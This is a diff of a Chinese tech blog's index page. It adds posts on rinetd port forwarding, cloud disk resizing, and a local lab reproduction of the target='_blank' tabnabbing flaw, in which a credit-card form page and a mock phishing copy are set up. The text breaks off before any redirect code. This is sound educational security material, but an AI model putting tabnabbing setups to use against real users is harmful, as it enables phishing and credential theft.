@@ -155,7 +155,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2015/10/16/linux-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2-CodeIgniter-3-%E6%8A%A5%E9%94%99-session-%E9%94%99%E8%AF%AF/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2019/01/21/Linux-%E4%B8%8B%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%B7%A5%E5%85%B7-rinetd/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -169,7 +169,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2015/10/16/linux-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2-CodeIgniter-3-%E6%8A%A5%E9%94%99-session-%E9%94%99%E8%AF%AF/" class="post-title-link" itemprop="url">linux 环境部署 CodeIgniter 3 报错 session 错误</a>
+            <a href="/2019/01/21/Linux-%E4%B8%8B%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%B7%A5%E5%85%B7-rinetd/" class="post-title-link" itemprop="url">Linux 下端口映射工具 rinetd</a>
         </h2>
 
         <div class="post-meta">
@@ -179,7 +179,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2015-10-16 14:06:00" itemprop="dateCreated datePublished" datetime="2015-10-16T14:06:00+08:00">2015-10-16</time>
+              <time title="创建时间：2019-01-21 11:28:00" itemprop="dateCreated datePublished" datetime="2019-01-21T11:28:00+08:00">2019-01-21</time>
             </span>
 
           
@@ -193,19 +193,29 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <hr>
-<h2 id="权限不足"><a href="#权限不足" class="headerlink" title="权限不足"></a>权限不足</h2><blockquote>
-<p>codeigniter Message: mkdir(): Invalid path Filename: drivers&#x2F;Session_files_driver.php</p>
-</blockquote>
-<p>看起来像权限问题，在默认情况下使用的是php.ini里面的设置</p>
-<p>排除权限问题以后就正常了</p>
-<p>也可以在congfig文件夹里面的 config.php 文件的371行增加一句</p>
-<p><code>$config[&#39;sess_save_path&#39;] = &#39;./你可以有权限读写的目录路径&#39;;</code></p>
-<p>本质上 session 默认配置下是文件读写操作，所以需要有权限。</p>
-<hr>
-<h2 id="自动加载-session-模块报错"><a href="#自动加载-session-模块报错" class="headerlink" title="自动加载 session 模块报错:"></a>自动加载 session 模块报错:</h2><p>解决办法:<br>先生成一个 key 用于加密</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">library</span>(<span class="string">&#x27;encryption&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$this</span>-&gt;encryption-&gt;<span class="title function_ invoke__">create_key</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>;</span><br></pre></td></tr></table></figure>
-<p>然后在配置文件里面把 key 写入<br><code> $config[&#39;encryption_key&#39;] = &#39;生成的key&#39;;</code></p>
+          <p>Linux下简单好用的工具rinetd，实现端口映射&#x2F;转发&#x2F;重定向</p>
+<p>官网地址<a target="_blank" rel="noopener" href="http://www.boutell.com/rinetd">http://www.boutell.com/rinetd</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#软件下载</span></span><br><span class="line">wget http://www.boutell.com/rinetd/http/rinetd.tar.gz</span><br><span class="line"><span class="comment">#解压安装</span></span><br><span class="line">tar zxvf rinetd.tar.gz</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑配置</span></span><br><span class="line">vi /etc/rinetd.conf</span><br><span class="line">0.0.0.0 8080   172.19.94.3 8080</span><br><span class="line">0.0.0.0 2222   192.168.0.103 3389</span><br><span class="line">1.2.3.4 80     192.168.0.10 80</span><br></pre></td></tr></table></figure>
+
+<h3 id="说明一下"><a href="#说明一下" class="headerlink" title="说明一下"></a>说明一下</h3><ul>
+<li>0.0.0.0表示本机绑定所有可用地址</li>
+<li>将所有发往本机 8080 端口的请求转发到 172.19.94.3 的 8080 端口</li>
+<li>将所有发往本机 2222 端口的请求转发到 192.168.0.103的 3389 端口</li>
+<li>将所有发往 1.2.3.4 的 80 端口请求转发到 192.168.0.10 的 80 端口</li>
+</ul>
+<h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p>bindaddress bindport connectaddress connectport</p>
+<p>绑定的地址  绑定的端口  连接的地址  连接的端口</p>
+<p>或</p>
+<p>[Source Address] [Source Port] [Destination Address] [Destination Port]</p>
+<p>源地址  源端口   目的地址  目的端口</p>
+<p>###启动程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkill rinetd  ##关闭进程</span><br><span class="line">rinetd -c /etc/rinetd.conf  ##启动转发</span><br></pre></td></tr></table></figure>
+<p>把这条命令加到 &#x2F;etc&#x2F;rc.local 里面开机自动运行(可能情况不同，具体看如何实现开机启动的)</p>
+<h3 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h3><p>netstat -antup</p>
+<h3 id="需要注意"><a href="#需要注意" class="headerlink" title="需要注意"></a>需要注意</h3><ol>
+<li>rinetd.conf 中绑定的本机端口必须没有被其它程序占用</li>
+<li>运行 rinetd 的系统防火墙应该打开绑定的本机端口</li>
+</ol>
 
       
     </div>
@@ -225,7 +235,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2015/09/22/%E5%85%B3%E4%BA%8E%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81%E4%B8%AD-DOCTYPE-%E7%9A%84%E7%AC%94%E8%AE%B0/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2019/01/03/linux-%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -239,7 +249,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2015/09/22/%E5%85%B3%E4%BA%8E%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81%E4%B8%AD-DOCTYPE-%E7%9A%84%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">关于网页源码中 DOCTYPE 的笔记</a>
+            <a href="/2019/01/03/linux-%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/" class="post-title-link" itemprop="url">linux 磁盘扩容</a>
         </h2>
 
         <div class="post-meta">
@@ -249,7 +259,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2015-09-22 15:05:00" itemprop="dateCreated datePublished" datetime="2015-09-22T15:05:00+08:00">2015-09-22</time>
+              <time title="创建时间：2019-01-03 18:23:00" itemprop="dateCreated datePublished" datetime="2019-01-03T18:23:00+08:00">2019-01-03</time>
             </span>
 
           
@@ -263,71 +273,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>平时用HTML5 所以都直接简写 doctype</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这个东西完整写法是</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>除了上面这种 其实还有几种声明方式</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* 过渡的(Transitional)：要求非常宽松的DTD，它允许你继续使用HTML4.01的标识(但是要符合xhtml的写法)，完整代码如下：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* 严格的(Strict)：要求严格的DTD，你不能使用任何表现层的标识和属性，例如<span class="tag">&lt;<span class="name">br</span>&gt;</span>，完整代码如下：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* 框架的(Frameset)：专门针对框架页面设计使用的DTD，如果你的页面中包含有框架，需要采用这种DTD，完整代码如下：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Frameset//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2015/09/14/Yii1-%E6%8E%A7%E5%88%B6%E5%89%8D%E7%AB%AF%E8%BD%BD%E5%85%A5%E6%96%87%E4%BB%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="透明白">
-      <meta itemprop="description" content="凑字数">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="名字还没想好">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2015/09/14/Yii1-%E6%8E%A7%E5%88%B6%E5%89%8D%E7%AB%AF%E8%BD%BD%E5%85%A5%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">Yii1 控制前端载入文件</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2015-09-14 17:11:00" itemprop="dateCreated datePublished" datetime="2015-09-14T17:11:00+08:00">2015-09-14</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>通过逻辑控制前端文件载入，并且可以调整载入位置，避免直接修改模版，减少模版里面的逻辑<br>但因为现在流行前后端分离，其实这个已经没啥大用了，做个记录。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Yii</span>::<span class="title function_ invoke__">app</span>()-&gt;clientScript-&gt;<span class="title function_ invoke__">registerCssFile</span>(CSS_URL.<span class="string">&#x27;reset.css&#x27;</span>);</span><br><span class="line"><span class="title class_">Yii</span>::<span class="title function_ invoke__">app</span>()-&gt;clientScript-&gt;<span class="title function_ invoke__">registerCssFile</span>(CSS_URL.<span class="string">&#x27;my.css&#x27;</span>);</span><br><span class="line"><span class="title class_">Yii</span>::<span class="title function_ invoke__">app</span>()-&gt;clientScript-&gt;<span class="title function_ invoke__">registerCss</span>(<span class="string">&#x27;remove-footer&#x27;</span>,<span class="string">&quot;#footer&#123;display:none;&#125;&quot;</span>);</span><br><span class="line"><span class="title class_">Yii</span>::<span class="title function_ invoke__">app</span>()-&gt;clientScript-&gt;<span class="title function_ invoke__">registerScriptFile</span>(JS_URL.<span class="string">&#x27;remove_rmenu.js&#x27;</span>,<span class="title class_">CClientScript</span>::<span class="variable constant_">POS_HEAD</span>);</span><br><span class="line"><span class="title class_">Yii</span>::<span class="title function_ invoke__">app</span>()-&gt;clientScript-&gt;<span class="title function_ invoke__">registerScriptFile</span>(JS_URL.<span class="string">&#x27;jquery-ui.min.js&#x27;</span>,<span class="title class_">CClientScript</span>::<span class="variable constant_">POS_HEAD</span>);</span><br><span class="line"><span class="title class_">Yii</span>::<span class="title function_ invoke__">app</span>()-&gt;clientScript-&gt;<span class="title function_ invoke__">registerScriptFile</span>(SITE_URL.<span class="string">&#x27;/assets/MathJax2.5/MathJax.js?config=default&#x27;</span>,<span class="title class_">CClientScript</span>::<span class="variable constant_">POS_HEAD</span>);</span><br></pre></td></tr></table></figure>
+          <p>记录一下云主机的扩容</p>
+<p>假如是设备 &#x2F;dev&#x2F;vdb 挂载在 &#x2F;data 目录</p>
+<ol>
+<li>卸载</li>
+<li>检查磁盘</li>
+<li>调整分区大小</li>
+<li>挂载<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//针对ext4文件格式的操作系统（如CentOS6）：</span><br><span class="line">umount /dev/vdb</span><br><span class="line">e2fsck -f /dev/vdb</span><br><span class="line">resize2fs /dev/vdb</span><br><span class="line">mount /dev/vdb /data</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//针对xfs文件格式的操作系统（如CentOS7）</span><br><span class="line">umount /dev/vdb</span><br><span class="line">xfs_repair /dev/vdb</span><br><span class="line">mount /dev/vdb /data</span><br><span class="line">xfs_growfs /data</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>上面的情况仅限于 2TB 以内的 MBR 分区。<br>如果是扩容到 2TB 以上的，从 MBR 转移 GPT 分区，需要先转移文件 然后重新分区。不要在没有备份的情况下轻易尝试直接转换。</p>
+<p>参考资料：<br><a target="_blank" rel="noopener" href="https://docs.ucloud.cn/udisk/userguide/extend/linux_raw">https://docs.ucloud.cn/udisk/userguide/extend/linux_raw</a></p>
 
       
     </div>
@@ -347,7 +303,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2015/08/25/MySQL-%E8%A7%A6%E5%8F%91%E5%99%A8%E7%AE%80%E5%8D%95%E5%AE%9E%E4%BE%8B/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -361,7 +317,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2015/08/25/MySQL-%E8%A7%A6%E5%8F%91%E5%99%A8%E7%AE%80%E5%8D%95%E5%AE%9E%E4%BE%8B/" class="post-title-link" itemprop="url">MySQL 触发器简单实例</a>
+            <a href="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/" class="post-title-link" itemprop="url">实战重现隐藏在 A 标签 _blank 下的危险漏洞,简略说明 noopener 的作用</a>
         </h2>
 
         <div class="post-meta">
@@ -371,7 +327,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2015-08-25 17:56:00" itemprop="dateCreated datePublished" datetime="2015-08-25T17:56:00+08:00">2015-08-25</time>
+              <time title="创建时间：2018-12-24 16:56:00" itemprop="dateCreated datePublished" datetime="2018-12-24T16:56:00+08:00">2018-12-24</time>
             </span>
 
           
@@ -385,9 +341,43 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*取消外键约束*/</span></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*创建C1表 主键ID 字段name*/</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `c1`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `c1` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">120</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>MEMORY <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*C2与C1结构相同 去掉了ID自增*/</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `c2`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `c2` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">120</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>MEMORY <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*给C1创建一个触发器 名称叫c1-insert*/</span><span class="comment">/*触发条件是 AFTER INSERT*/</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> IF <span class="keyword">EXISTS</span> `c1<span class="operator">-</span><span class="keyword">insert</span>`;</span><br><span class="line">DELIMITER ;;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> `c1<span class="operator">-</span><span class="keyword">insert</span>` AFTER <span class="keyword">INSERT</span> <span class="keyword">ON</span> `c1` <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span> <span class="keyword">BEGIN</span> </span><br><span class="line"><span class="comment">/*插入后的ID*/</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@id</span> <span class="operator">=</span> NEW.id; </span><br><span class="line"><span class="comment">/*插入后的name*/</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@name</span> <span class="operator">=</span> NEW.name ;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `c2` (`id`, `name`) <span class="keyword">VALUES</span> (<span class="variable">@id</span>,<span class="variable">@name</span>); <span class="comment">/*插入到C2表*/</span></span><br><span class="line"><span class="keyword">END</span></span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*给C1创建一个触发器 名称叫c1-update*/</span><span class="comment">/*触发条件是 AFTER UPDATE*/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> IF <span class="keyword">EXISTS</span> `c1<span class="operator">-</span><span class="keyword">update</span>`;</span><br><span class="line">DELIMITER ;;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> `c1<span class="operator">-</span><span class="keyword">update</span>` AFTER <span class="keyword">UPDATE</span> <span class="keyword">ON</span> `c1` <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span> BEGIN.</span><br><span class="line"><span class="comment">/*修改前的ID*/</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@id</span> <span class="operator">=</span> OLD.id; </span><br><span class="line"><span class="comment">/*修改后的name*/</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@name</span> <span class="operator">=</span> NEW.name;</span><br><span class="line"><span class="keyword">UPDATE</span> `c2` <span class="keyword">SET</span> `name`<span class="operator">=</span><span class="variable">@name</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="variable">@id</span>; <span class="comment">/*更新到C2表*/</span></span><br><span class="line"><span class="keyword">END</span></span><br><span class="line">;;</span><br></pre></td></tr></table></figure>
+          <p>前几日，在看阮一峰老师的博客<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2018/12/weekly-issue-36.html">文章</a>中，发现了这么<a target="_blank" rel="noopener" href="https://www.tutorialdocs.com/article/html-opener-blank.html">一篇</a> 。标题为 《target &#x3D; “_blank” 的危险性（英文）》。这篇文章同事看过之后因为不理解其中的危险之处，念念不忘。于是这里我们来重现一下这个漏洞。</p>
+<p>首先做点准备：</p>
+<p>准备两个域名 </p>
+<ul>
+<li>a.com </li>
+<li>b.com</li>
+</ul>
+<p>分别解析到 127.0.0.1<br>配置好两个域名对应的http服务</p>
+<p>安装好 chrome 浏览器<br>正式开始</p>
+<p>首先在a.com下 建立1.html 写入代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">         </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;信用卡+密码表单&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://b.com/b.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> &gt;</span>B站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在代码中，我们建立了一个A标签，链接到B站点，地址为 <a target="_blank" rel="noopener" href="http://b.com/b.html">http://b.com/b.html</a> 打开方式为 新标签页打开 也就是target&#x3D;”_blank”</p>
+<p>将这个1.html文件复制一份到b站点的目录中并修改代码为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;信用卡+密码表单+钓鱼页面&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://b.com/b.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> &gt;</span>B站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意”钓鱼页面”部分，这里是为了区分第一个页面加的标记。准备好以后再建立一个 b.html 满足 A 标签的目标文件。</p>
+<p>b.html 代码为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span 